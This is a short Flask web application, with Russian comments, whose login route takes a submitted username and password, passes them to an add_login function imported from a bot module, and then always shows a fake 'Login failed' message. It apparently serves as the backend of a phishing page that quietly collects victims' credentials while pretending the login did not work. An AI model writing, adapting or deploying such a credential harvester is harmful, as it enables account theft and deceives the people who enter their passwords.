from flask import Flask, request, render_template
import os
import asyncio
from bot import add_login

# Импортируем асинхронную функцию
from bot import add_login  # bot.py должен быть рядом

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    try:
        asyncio.run(add_login(username, password))
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.create_task(add_login(username, password))

    return "<h3>Login failed. Please try again.</h3>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
